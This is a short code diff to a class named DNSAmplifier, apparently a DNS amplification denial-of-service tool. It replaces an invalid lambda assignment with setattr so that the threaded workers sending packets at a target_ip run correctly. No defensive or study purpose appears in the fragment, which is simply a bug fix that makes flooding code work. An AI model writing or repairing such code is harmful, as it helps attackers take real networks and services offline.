@@ -107,7 +107,7 @@ class DNSAmplifier:
         
         workers = []
         for i in range(threads):
-            t = threading.Thread(target=lambda: self.packets += self.worker(target_ip, duration, i))
+            t = threading.Thread(target=lambda: setattr(self, 'packets', self.packets + self.worker(target_ip, duration, i)))
             t.daemon = True
             t.start()
             workers.append(t)
